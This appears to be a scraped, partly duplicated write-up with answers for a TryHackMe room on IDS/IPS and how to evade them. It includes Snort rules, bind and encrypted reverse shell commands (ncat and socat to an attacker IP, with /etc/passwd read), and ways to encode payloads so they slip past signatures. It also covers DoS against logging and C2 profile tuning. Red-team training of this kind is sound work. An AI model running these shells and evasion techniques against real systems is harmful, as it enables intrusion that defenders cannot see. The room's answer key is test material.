-FF Start the AttackBox and the attached machine. Consider the following three types of Nmap scans: -sX for Xmas Scan -sF for FIN Scan -sN for Null Scan Which of the above three arguments would return meaningful results when scanning MACHINE_IP ? Ans: -sF Question: What is the option in hping3 to set a custom TCP window size? Ans: -w Task 5: Evasion via Payload Manipulation \u00b6 Evasion via payload manipulation includes: Obfuscating and encoding the payload Encrypting the communication channel Modifying the shellcode Obfuscate and Encode the Payload \u00b6 Because the IDS rules are very specific, you can make minor changes to avoid detection. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication. Consider the command ncat -lvnp 1234 -e /bin/bash , where ncat will listen on TCP port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that you can apply to your command to avoid triggering IDS/IPS signatures. Encode to Base64 format \u00b6 You can use one of the many online tools that encode your input to Base64. Alternatively, you can use base64 commonly found on Linux systems. Pentester Terminal pentester @TryHackMe $ cat input . txt ncat -lvnp 1234 -e / bin / bash $ base64 input . txt bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA == ncat -lvnp 1234 -e /bin/bash is encoded to bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== . URL Encoding \u00b6 URL encoding converts certain characters to the form %HH, where HH is the hexadecimal ASCII representation. English letters, period, dash, and underscore are not affected. You can refer to section 2.4 in RFC 3986 for more information. One utility that you can easily install on your Linux system is urlencode ; alternatively, you can either use an online service or search for similar utilities on MS Windows and macOS. To follow along on the AttackBox, you can install urlencode by running the command apt install gridsite-clients . Pentester Terminal pentester @TryHackMe $ urlencode ncat -lvnp 1234 -e / bin / bash ncat % 20-lvnp % 201234 % 20-e % 20 % 2Fbin % 2Fbash ncat -lvnp 1234 -e /bin/bash becomes ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash after URL encoding. Depending what the IDS/IPS signature is matching, URL encoding might help evade detection. Use Escaped Unicode \u00b6 Some applications will still process your input and execute it properly if you use escaped Unicode. There are multiple ways to use escaped Unicode depending on the system processing the input string. For example, you can use CyberChef to select and configure the Escape Unicode Characters recipe as shown in the image below. Search for Escape Unicode Characters Drag it to the Recipe column Ensure you a check-mark near Encode all chars with a prefix of \\u Ensure you have a check-mark near Uppercase hex with a padding of 4 Alt text If you use the format \\uXXXX , then ncat -lvnp 1234 -e /bin/bash becomes \\u006e\\u0063\\u0061\\u0074\\u0020\\u002d\\u006c\\u0076\\u006e\\u0070\\u0020\\u0031\\u0032\\u0033\\u0034\\u0020\\u002d\\u0065\\u0020\\u002f\\u0062\\u0069\\u006e\\u002f\\u0062\\u0061\\u0073\\u0068 . It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it. Encrypt the Communication Channel \u00b6 Because an IDS/IPS won\u2019t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key. One direct approach is to create the necessary encryption key on the attacker\u2019s system and set socat to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps: Create the key Listen on the attacker\u2019s machine Connect to the attacker\u2019s machine Firstly , On the AttackBox or any Linux system, we can create the key using openssl . openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt The arguments in the above command are: req indicates that this is a certificate signing request. Obviously, we won\u2019t submit our certificate for signing. -x509 specifies that we want an X.509 certificate -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as -newkey rsa:2048 .) -days 365 shows that the validity of our certificate will be one year -subj sets data, such as organization and country, via the command-line. -nodes simplifies our command and does not encrypt the private key -keyout PRIVATE_KEY specifies the filename where we want to save our private key -out CERTIFICATE specifies the filename to which we want to write the certificate request The above command returns: Private key: thm-reverse.key Certificate: thm-reverse.crt The Privacy Enhanced Mail (PEM) .pem file requires the concatenation of the private key .key and the certificate .crt files. We can use cat to create our PEM file from the two files that we have just created: cat thm-reverse.key thm-reverse.crt > thm-reverse.pem . Secondly , with the PEM file ready, we can start listening while using the key for encrypting the communication with the client. socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT If you are not familiar with socat , the options that we used are: -d -d provides some debugging data (fatal, error, warning, and notice messages) OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection verify=0 disables checking peer\u2019s certificate fork creates a sub-process to handle each new connection. Thirdly , on the victim system, socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash . Note that the EXEC invokes the specified program. Let\u2019s demonstrate this. On the attacker system, we carried out the following: Pentester Terminal pentester @TryHackMe $ openssl req -x509 -newkey rsa : 4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse . key -out thm-reverse . crt Generating a RSA private key ........................++++ ......++++ writing new private key to 'thm-reverse.key' ----- pentester @TryHackMe $ ls thm-reverse . crt thm-reverse . key pentester @TryHackMe $ cat thm-reverse . key thm-reverse . crt > thm-reverse . pem pentester @TryHackMe $ socat -d -d OPENSSL-LISTEN : 4443 , cert = thm-reverse . pem , verify = 0 , fork STDOUT 2022 / 02 / 24 13 : 39 : 07 socat [ 1208 ] W ioctl ( 6 , IOCTL_VM_SOCKETS_GET_LOCAL_CID , ...): Inappropriate ioctl for device 2022 / 02 / 24 13 : 39 : 07 socat [ 1208 ] N listening on AF = 2 0 . 0 . 0 . 0 : 4443 As we have a listener on the attacker system, we switched to the victim machine, and we executed the following: Target Terminal pentester @target $ socat OPENSSL : 10 . 20 . 30 . 129 : 4443 , verify = 0 EXEC :/ bin / bash Back to the attacker system, let\u2019s run cat /etc/passwd : Pentester Terminal pentester @TryHackMe $ socat -d -d OPENSSL-LISTEN : 4443 , cert = thm-reverse . pem , verify = 0 , fork STDOUT [...] 2022 / 02 / 24 15 : 54 : 28 socat [ 7620 ] N starting data transfer loop with FDs [ 7 , 7 ] and [ 1 , 1 ] cat / etc / passwd root : x : 0 : 0 : root :/ root :/ bin / bash bin : x : 1 : 1 : bin :/ bin :/ sbin / nologin [...] However, if the IDS/IPS inspects the traffic, all the packet data will be encrypted. In other words, the IPS will be completely oblivious to exchange traffic and commands such as cat /etc/passwd . The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains cat /etc/passwd ; however, it is encrypted. As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalent socat connection that does not use encryption. On the attacker\u2019s system, we run socat -d -d TCP-LISTEN:4443,fork STDOUT . On the victim\u2019s machine, we run socat TCP:10.20.30.129:4443 EXEC:/bin/bash . Back on the attacker\u2019s system, we type cat /etc/passwd and hit Enter/Return. Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker. Furthermore, it is a trivial task to follow the TCP stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the \u201cFollow TCP Stream\u201d option from Wireshark. Modify the data \u00b6 Consider the simple case where you want to use Ncat to create a bind shell. The following command ncat -lvnp 1234 -e /bin/bash tells ncat to listen on TCP port 1234 and bind Bash shell to it. If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific. Scanning for ncat -lvnp can be easily evaded by changing the order of the flags. On the other hand, inspecting the payload for ncat - can be evaded by adding an extra white space, such as ncat - which would still run correctly on the target system. If the IDS is looking for ncat , then simple changes to the original command won\u2019t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as nc or socat . Alternatively, you can consider a different encoding if the target system can process it properly. Answer the questions bellow Question: Using base64 encoding, what is the transformation of cat /etc/passwd ? Ans: Y2F0IC9ldGMvcGFzc3dkCg== Question: The base32 encoding of a particular string is NZRWC5BAFVWCAOBQHAYAU=== . What is the original string? Ans: ncat -l 8080 Question: Using the provided openssl command above. You created a certificate, which we gave the extension .crt , and a private key, which we gave the extension .key . What is the first line in the certificate file? Ans: -----BEGIN CERTIFICATE----- Question: What is the last line in the private key file? Ans: -----END PRIVATE KEY----- Question: On the attached machine from the previous task, browse to http://MACHINE_IP:8080 , where you can write your Linux commands. Note that no output will be returned. A command like ncat -lvnp 1234 -e /bin/bash will create a bind shell that you can connect to it from the AttackBox using ncat MACHINE_IP 1234 ; however, some IPS is filtering out the command we are submitting on the form. Using one of the techniques mentioned in this task, try to adapt the command typed in the form to run properly. Once you connect to the bind shell using ncat MACHINE_IP 1234 , find the user\u2019s name. Ans: redteamnetsec Task 6: Evasion via Route Manipulation \u00b6 Evasion via route manipulation includes: Relying on source routing Using proxy servers Relying on Source Routing \u00b6 In many cases, you can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option --ip-options . Nmap offers loose and strict routing: Loose routing can be specified using L . For instance, --ip-options \"L 10.10.10.50 10.10.50.250\" requests that your scan packets are routed through the two provided IP addresses. Strict routing can be specified using S . Strict routing requires you to set every hop between your system and the target host. For instance, --ip-options \"S 10.10.10.1 10.10.20.2 10.10.30.3\" specifies that the packets go via these three hops before reaching the target host. Using Proxy Servers \u00b6 The use of proxy servers can help hide your source. Nmap offers the option --proxies that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the format proto://host:port . Valid protocols are HTTP and SOCKS4; moreover, authentication is not currently supported. Consider the following example. Instead of running nmap -sS MACHINE_IP , you would edit your Nmap command to something like nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP . This way, you would make your scan go through HTTP proxy host1, then SOCKS4 proxy host2, before reaching your target. It is important to note that finding a reliable proxy requires some trial and error before you can rely on it to hide your Nmap scan source. If you use your web browser to connect to the target, it would be a simple task to pass your traffic via a proxy server. Other network tools usually provide their own proxy settings that you can use to hide your traffic source. Answer the questions bellow Question: Protocols used in proxy servers can be HTTP, HTTPS, SOCKS4, and SOCKS5. Which protocols are currently supported by Nmap? Ans: HTTP SOCKS4 Task 7: Evasion via Tactical DoS \u00b6 Evasion via tactical DoS includes: Launching denial of service against the IDS/IPS Launching denial of Service against the logging server An IDS/IPS requires a high processing power as the number of rules grows and the network traffic volume increases. Moreover, especially in the case of IDS, the primary response is logging traffic information matching the signature. Consequently, you might find it beneficial if you can: Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS. Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity. It is also worth noting that the target of your attack can be the IDS operator. By causing a vast number of false positives, you can cause operator fatigue against your \u201cadversary.\u201d Answer the questions bellow Question: Make sure you have read and understood the three points of this task. Ans: No answer needed Task 8: C2 and IDS/IPS Evasion \u00b6 Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evade IDS/IPS systems. If you are using such a framework, it is worth creating a custom profile instead of relying on a default one. Examples variables you can control include the following: User-Agent : The tool or framework you are using can expose you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your settings. Sleep Time : The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system. Jitter : This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of \u00b130% to further evade detection. SSL Certificate : Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a very worthy investment of time. DNS Beacon : Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data. This CobaltStrike Guideline Profile shows how a profile is put together. Answer the questions bellow Question: Which variable would you modify to add a random sleep time between beacon check-ins? Ans: Jitter Task 9: Next-Gen Security \u00b6 Next-Generation Network IPS (NGNIPS) has the following five characteristics according to Gartner: Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do. Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer. Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions. Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic. Agile engine: Support upgrade paths to benefit from new information feeds. Because a Next-Generation Firewall (NGFW) provides the same functionality as an IPS, it seems that the term NGNIPS is losing popularity for the sake of NGFW. You can read more about NGFW in the Red Team Firewalls room. Task 10: Summary \u00b6 In this room, we covered IDS and IPS types based on installation location and detection engine. We also considered Snort 2 rules as an example of how IDS rules are triggered. To evade detection, one needs to gather as much information as possible about the deployed devices and experiment with different techniques. In other words, trial and error might be inevitable unless one has complete knowledge of the security devices and their configuration. Using Command and Control (C2) frameworks provides their contribution to IPS evasion via controlling the shape of the traffic to make it as innocuous as it can get. C2 profiles are a critical feature that one should learn to master if they use any C2 framework that supports malleable profiles.","title":"Network Security Solutions"},{"location":"tryhackme/room/l/redteamnetsec/#network-security-solutions","text":"","title":"Network Security Solutions"},{"location":"tryhackme/room/l/redteamnetsec/#task-1-introduction","text":"An Intrusion Detection System (IDS) is a system that detects network or system intrusions. One analogy that comes to mind is a guard watching live feeds from different security cameras. He can spot a theft, but he cannot stop it by himself. However, if this guard can contact another guard and ask them to stop the robber, detection turns into prevention. An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that can detect and prevent intrusions. Understanding the difference between detection and prevention is essential. Snort is a network intrusion detection and intrusion prevention system. Consequently, Snort can be set up as an IDS or an IPS. For Snort to function as an IPS, it needs some mechanism to block ( drop ) offending connections. This capability requires Snort to be set up as inline and to bridge two or more network cards. As a signature-based network IDS, Snort is shown in the figure below. The following figure shows how Snort can be configured as an IPS if set up inline. IDS setups can be divided based on their location in the network into: Host-based IDS (HIDS) Network-based IDS (NIDS) The host-based IDS (HIDS) is installed on an OS along with the other running applications. This setup will give the HIDS the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host. The network-based IDS (NIDS) is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic. In the figure below, we use two red circles to show the difference in the coverage of a HIDS versus a NIDS. Answer the questions bellow Question: What does an IPS stand for? Ans: Intrusion Prevention System Question: What do you call a system that can detect malicious activity but not stop it? Ans: Intrusion Detection System","title":"Task 1: Introduction"},{"location":"tryhackme/room/l/redteamnetsec/#task-2-ids-engine-types","text":"We can classify network traffic into: Benign traffic : This is the usual traffic that we expect to have and don\u2019t want the IDS to alert us about. Malicious traffic : This is abnormal traffic that we don\u2019t expect to see under normal conditions and consequently want the IDS to detect it. In the same way that we can classify network traffic, we can also classify host activity. The IDS detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing \u201cnormal\u201d makes it easy to detect any deviation from normal. Consequently, the detection engine of an IDS can be: Signature-based : A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against. Anomaly-based : This requires the IDS to have knowledge of what regular traffic looks like. In other words, we need to \u201cteach\u201d the IDS what normal is so that it can recognize what is not normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules. Put in another way, signature-based IDS recognizes malicious traffic, so everything that is not malicious is considered benign (normal). This approach is commonly found in anti-virus software, which has a database of known virus signatures. Anything that matches a signature is detected as a virus. An anomaly-based IDS recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what \u201cnormal\u201d is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browser\u2019s performance deviated from normal. Answer the questions bellow Question: What kind of IDS engine has a database of all known malicious packets\u2019 contents? Ans: Signature-based Question: What kind of IDS engine needs to learn what normal traffic looks like instead of malicious traffic? Ans: Anomaly-based Question: What kind of IDS engine needs to be updated constantly as new malicious packets and activities are discovered? Ans: Signature-based","title":"Task 2: IDS Engine Types"},{"location":"tryhackme/room/l/redteamnetsec/#task-3-idsips-rule-triggering","text":"Each IDS/IPS has a certain syntax to write its rules. For example, Snort uses the following format for its rules: Rule Header (Rule Options) , where Rule Header constitutes: Action: Examples of action include alert , log , pass , drop , and reject . Protocol: TCP , UDP , ICMP , or IP . Source IP/Source Port: !10.10.0.0/16 any refers to everything not in the class B subnet 10.10.0.0/16 . Direction of Flow: -> indicates left (source) to right (destination), while <> indicates bi-directional traffic. Destination IP/Destination Port: 10.10.0.0/16 any to refer to class B subnet 10.10.0.0/16 . Below is an example rule to drop all ICMP traffic passing through Snort IPS: drop icmp any any -> any any (msg: \"ICMP Ping Scan\"; dsize:0; sid:1000020; rev: 1;) The rule above instructs the Snort IPS to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is \u201cICMP Ping Scan.\u201d Let\u2019s consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handles HTTP POST method requests, allowing the attacker to run system commands. Let\u2019s consider the following \u201cnaive\u201d approach. We want to create a Snort rule that detects the term ncat in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability. alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; content:\"ncat\"; sid: 1000030; rev:1;) The rule above inspects the content of the packets exchanged with port 80 for the string ncat . Alternatively, you can choose to write the content that Snort will scan for in hexadecimal format. ncat in ASCII is written as 6e 63 61 74 in hexadecimal and it is encapsulated as a string by 2 pipe characters | . alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; content:\"|6e 63 61 74|\"; sid: 1000031; rev:1;) We can further refine it if we expect to see it in HTTP POST requests. Note that flow:established tells the Snort engine to look at streams started by a TCP 3-way handshake (established connections). alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; flow:established,to_server; content:\"POST\"; nocase; http_method; content:\"ncat\"; nocase; sid:1000032; rev:1;) If ASCII logging is chosen, the logs would be similar to the two alerts shown next. Snort Logs [**] [ 1 : 1000031 : 1 ] Netcat Exploitation [**] [ Priority : 0 ] 01 / 14 - 12 : 51 : 26 . 717401 10 . 14 . 17 . 226 : 45480 -> 10 . 10 . 112 . 168 : 80 TCP TTL : 63 TOS : 0x0 ID : 34278 IpLen : 20 DgmLen : 541 DF *** AP *** Seq : 0x26B5C2F Ack : 0x0 Win : 0x0 TcpLen : 32 [**] [ 1 : 1000031 : 1 ] Netcat Exploitation [**] [ Priority : 0 ] 01 / 14 - 12 : 51 : 26 . 717401 10 . 14 . 17 . 226 : 45480 -> 10 . 10 . 112 . 168 : 80 TCP TTL : 63 TOS : 0x0 ID : 34278 IpLen : 20 DgmLen : 541 DF *** AP *** Seq : 0x26B5C2F Ack : 0xF1090882 Win : 0x3F TcpLen : 32 TCP Options ( 3 ) => NOP NOP TS : 2244530364 287085341 There are a few points to make about signature-based IDS and its rules. If the attacker made even the slightest changes to avoid using ncat verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-based IDS or IPS is limited to how well-written and updated its signatures (rules) are. We discuss some evasion techniques in the next task. Answer the questions bellow Question: In the attached file, the logs show that a specific IP address has been detected scanning our system of IP address 10.10.112.168 . What is the IP address running the port scan? Ans: 10.14.17.226","title":"Task 3: IDS/IPS Rule Triggering"},{"location":"tryhackme/room/l/redteamnetsec/#task-4-evasion-via-protocol-manipulation","text":"Evading a signature-based IDS/IPS requires that you manipulate your traffic so that it does not match any IDS/IPS signatures. Here are four general approaches you might consider to evade IDS/IPS systems. Evasion via Protocol Manipulation Evasion via Payload Manipulation Evasion via Route Manipulation Evasion via Tactical Denial of Service (DoS) This room focuses on evasion using nmap and ncat / socat . The evasion techniques related to Nmap are discussed in great detail in the Firewalls room. This room will emphasize ncat and socat where appropriate. We will expand on each of these approaches in its own task. Let\u2019s start with the first one. Evasion via protocol manipulation includes: Relying on a different protocol Manipulating (Source) TCP/UDP port Using session splicing (IP packet fragmentation) Sending invalid packets","title":"Task 4: Evasion via Protocol Manipulation"},{"location":"tryhackme/room/l/redteamnetsec/#rely-on-a-different-protocol","text":"The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you don\u2019t create too much noise. We have an IPS set to block DNS queries and HTTP requests in the figure below. In particular, it enforces the policy where local machines cannot query external DNS servers but should instead query the local DNS server; moreover, it enforces secure HTTP communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS. Consider the case where you are using Ncat . Ncat, by default, uses a TCP connection; however, you can get it to use UDP using the option -u . To listen using TCP, just issue ncat -lvnp PORT_NUM where port number is the port you want to listen to. to connect to an Ncat instance listening on a TCP port, you can issue ncat TARGET_IP PORT_NUM Note that: -l tells ncat to listen for incoming connections -v gets more verbose output as ncat binds to a source port and receives a connection -n avoids resolving hostnames -p specifies the port number that ncat will listen on As already mentioned, using -u will move all communications over UDP. To listen using UDP, just issue ncat -ulvnp PORT_NUM where port number is the port you want to listen to. Note that unless you add -u , ncat will use TCP by default. To connect to an Ncat instance listening on a UDP port, you can issue nc -u TARGET_IP PORT_NUM Consider the following two examples: Running ncat -lvnp 25 on the attacker system and connecting to it will give the impression that it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI). Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.","title":"Rely on a Different Protocol"},{"location":"tryhackme/room/l/redteamnetsec/#manipulate-source-tcpudp-port","text":"Generally speaking, the TCP and UDP source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection, the port numbers are the primary indicator of the service used. In other words, network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyze the data carried by the TCP segments. Depending on the target security solution, you can make your port scanning traffic resemble web browsing or DNS queries. If you are using Nmap, you can add the option -g PORT_NUMBER (or --source-port PORT_NUMBER ) to make Nmap send all its traffic from a specific source port number. While scanning a target, use nmap -sS -Pn -g 80 -F MACHINE_IP to make the port scanning traffic appear to be exchanged with an HTTP server at first glance. If you are interested in scanning UDP ports, you can use nmap -sU -Pn -g 53 -F MACHINE_IP to make the traffic appear to be exchanged with a DNS server. Consider the case where you are using Ncat . You can try to camouflage the traffic as if it is some DNS traffic. On the attacker machine, if you want to use Ncat to listen on UDP port 53, as a DNS server would, you can use ncat -ulvnp 53 . On the target, you can make it connect to the listening server using ncat -u ATTACKER_IP 53 . Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server. On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use ncat -lvnp 80 . On the target, connect to the listening server using nc ATTACKER_IP 80 .","title":"Manipulate (Source) TCP/UDP Port"},{"location":"tryhackme/room/l/redteamnetsec/#use-session-splicing-ip-packet-fragmentation","text":"Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS reassembles the packets, the rule won\u2019t be triggered. Nmap offers a few options to fragment packets. You can add: -f to set the data in the IP packet to 8 bytes. -ff to limit the data in the IP packet to 16 bytes at most. --mtu SIZE to provide a custom size for data carried within the IP packet. The size should be a multiple of 8. Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such as Fragroute . fragroute can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with ip_frag SIZE to fragment the IP data according to the provided size. The size should be a multiple of 8. For example, you can create a configuration file fragroute.conf with one line, ip_frag 16 , to fragment packets where IP data fragments don\u2019t exceed 16 bytes. Then you would run the command fragroute -f fragroute.conf HOST . The host is the destination to which we would send the fragmented packets it.","title":"Use Session Splicing (IP Packet Fragmentation)"},{"location":"tryhackme/room/l/redteamnetsec/#sending-invalid-packets","text":"Generally speaking, the response of systems to valid packets tends to be predictable. However, it can be unclear how systems would respond to invalid packets. For instance, an IDS/IPS might process an invalid packet, while the target system might ignore it. The exact behavior would require some experimentation or inside knowledge. Nmap makes it possible to create invalid packets in a variety of ways. In particular, two common options would be to scan the target using packets that have: Invalid TCP/UDP checksum Invalid TCP flags Nmap lets you send packets with a wrong TCP/UDP checksum using the option --badsum . An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program. Nmap also lets you send packets with custom TCP flags, including invalid ones. The option --scanflags lets you choose which flags you want to set. URG for Urgent ACK for Acknowledge PSH for Push RST for Reset SYN for Synchronize FIN for Finish For instance, if you want to set the flags Synchronize, Reset, and Finish simultaneously, you can use --scanflags SYNRSTFIN , although this combination might not be beneficial for your purposes. If you want to craft your packets with custom fields, whether valid or invalid, you might want to consider a tool such as hping3 . We will list a few example options to give you an idea of packet crafting using hping3 . -t or --ttl to set the Time to Live in the IP header -b or --badsum to send packets with a bad UDP/TCP checksum -S , -A , -P , -U , -F , -R to set the TCP SYN, ACK, PUSH, URG, FIN, and RST flags, respectively There is a myriad of other options. Depending on your needs, you might want to check the hping3 manual page for the complete list. Answer the questions bellow Question: We use the following Nmap command, nmap -sU -F MACHINE_IP , to launch a UDP scan against our target. What is the option we need to add to set the source port to 161? Ans: -g 161 Question: The target allows Telnet traffic. Using ncat , how do we set a listener on the Telnet port? Ans: ncat -lvnp 23 Question: We are scanning our target using nmap -sS -F MACHINE_IP . We want to fragment the IP packets used in our Nmap scan so that the data size does not exceed 16 bytes. What is the option that we need to add? Ans: -FF Start the AttackBox and the attached machine. Consider the following three types of Nmap scans: -sX for Xmas Scan -sF for FIN Scan -sN for Null Scan Which of the above three arguments would return meaningful results when scanning MACHINE_IP ? Ans: -sF Question: What is the option in hping3 to set a custom TCP window size? Ans: -w","title":"Sending Invalid Packets"},{"location":"tryhackme/room/l/redteamnetsec/#task-5-evasion-via-payload-manipulation","text":"Evasion via payload manipulation includes: Obfuscating and encoding the payload Encrypting the communication channel Modifying the shellcode","title":"Task 5: Evasion via Payload Manipulation"},{"location":"tryhackme/room/l/redteamnetsec/#obfuscate-and-encode-the-payload","text":"Because the IDS rules are very specific, you can make minor changes to avoid detection. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication. Consider the command ncat -lvnp 1234 -e /bin/bash , where ncat will listen on TCP port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that you can apply to your command to avoid triggering IDS/IPS signatures.","title":"Obfuscate and Encode the Payload"},{"location":"tryhackme/room/l/redteamnetsec/#encode-to-base64-format","text":"You can use one of the many online tools that encode your input to Base64. Alternatively, you can use base64 commonly found on Linux systems. Pentester Terminal pentester @TryHackMe $ cat input . txt ncat -lvnp 1234 -e / bin / bash $ base64 input . txt bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA == ncat -lvnp 1234 -e /bin/bash is encoded to bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== .","title":"Encode to Base64 format"},{"location":"tryhackme/room/l/redteamnetsec/#url-encoding","text":"URL encoding converts certain characters to the form %HH, where HH is the hexadecimal ASCII representation. English letters, period, dash, and underscore are not affected. You can refer to section 2.4 in RFC 3986 for more information. One utility that you can easily install on your Linux system is urlencode ; alternatively, you can either use an online service or search for similar utilities on MS Windows and macOS. To follow along on the AttackBox, you can install urlencode by running the command apt install gridsite-clients . Pentester Terminal pentester @TryHackMe $ urlencode ncat -lvnp 1234 -e / bin / bash ncat % 20-lvnp % 201234 % 20-e % 20 % 2Fbin % 2Fbash ncat -lvnp 1234 -e /bin/bash becomes ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash after URL encoding. Depending what the IDS/IPS signature is matching, URL encoding might help evade detection.","title":"URL Encoding"},{"location":"tryhackme/room/l/redteamnetsec/#use-escaped-unicode","text":"Some applications will still process your input and execute it properly if you use escaped Unicode. There are multiple ways to use escaped Unicode depending on the system processing the input string. For example, you can use CyberChef to select and configure the Escape Unicode Characters recipe as shown in the image below. Search for Escape Unicode Characters Drag it to the Recipe column Ensure you a check-mark near Encode all chars with a prefix of \\u Ensure you have a check-mark near Uppercase hex with a padding of 4 Alt text If you use the format \\uXXXX , then ncat -lvnp 1234 -e /bin/bash becomes \\u006e\\u0063\\u0061\\u0074\\u0020\\u002d\\u006c\\u0076\\u006e\\u0070\\u0020\\u0031\\u0032\\u0033\\u0034\\u0020\\u002d\\u0065\\u0020\\u002f\\u0062\\u0069\\u006e\\u002f\\u0062\\u0061\\u0073\\u0068 . It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it.","title":"Use Escaped Unicode"},{"location":"tryhackme/room/l/redteamnetsec/#encrypt-the-communication-channel","text":"Because an IDS/IPS won\u2019t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key. One direct approach is to create the necessary encryption key on the attacker\u2019s system and set socat to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps: Create the key Listen on the attacker\u2019s machine Connect to the attacker\u2019s machine Firstly , On the AttackBox or any Linux system, we can create the key using openssl . openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt The arguments in the above command are: req indicates that this is a certificate signing request. Obviously, we 